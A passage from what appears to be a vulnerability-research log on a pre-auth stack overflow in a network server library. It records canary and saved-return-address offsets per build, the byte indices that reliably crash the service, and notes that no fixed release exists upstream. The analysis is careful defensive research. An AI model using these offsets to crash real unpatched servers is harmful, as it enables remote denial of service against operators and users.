  override and fresh ports. Replay request #1261/#1271/#1304/#1329 is still
  open for those earlier claims.
- Debug `-O0` geometry (W1/W2): canary at 104-111, saved rbp at 112-119 and
  saved rip at 120-127 remain an address-based inference for the 104-119
  bytes; only the 120 landing has a write-site log. Plain `-O2` geometry
  (W8) is measured from the store instruction and frame words: canary at
  104-111, saved rbp at 120, saved rip at 136-143. Both ranges are specific
  to g++ 13.3.0 on this host and must be re-measured on any other build.
- W6's DoS signature (SIGSEGV/SIGILL) is a **Debug -O0 layout effect**; W7's
  -8/120 samples were non-fatal at `-O2`. W8/W10 measure a distinct stock `-O2`
  consequence: indices 105-111 zero a nonzero canary byte and abort with
  SIGABRT. Both are deterministic pre-auth remote DoS on their own builds;
  neither is a command side effect, and the signatures are not interchangeable.
- Saved-RIP indices 136/139 are DEAD exit 139 on the real -O2 binary (W10),
  matching the witness; W8's two ALIVE rows were Debug -O0 evidence (a build
  label mix-up), not an unreproduced -O2 result. No plain -O2 saved-RIP DoS
  claim is made beyond the observed fixed-NUL redirect and SIGSEGV.
- Rung 5 is out of reach on this evidence: no chosen byte, no benign command
  side effect, no reuse of a long-lived service. The class boundary also stands:
  this is a pre-auth network server library, not a web-facing server.
- No fixed release exists upstream as of 2026-11-22 (W5); the fixed commit is
  the only fixed control. Do not infer that 07.37-07.39 are released fixes.
